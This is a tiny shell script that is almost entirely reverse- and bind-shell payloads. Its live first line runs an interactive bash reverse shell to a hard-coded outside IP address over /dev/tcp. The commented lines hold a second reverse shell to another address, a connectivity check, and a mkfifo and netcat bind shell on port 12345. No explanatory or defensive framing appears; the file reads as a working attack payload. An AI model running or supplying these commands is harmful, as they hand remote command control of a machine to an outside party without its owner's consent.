bash -c 'bash -i >& /dev/tcp/140.112.90.51/11992 0>&1'
# bash -c 'bash -i >& /dev/tcp/140.112.30.43/12345 0>&1'
# echo working > /dev/tcp/140.112.30.43/12345
# rm -f /tmp/f; mkfifo /tmp/f
# cat /tmp/f | /bin/sh -i 2>&1 | nc -l 0.0.0.0 12345 > /tmp/f
# sleep 3
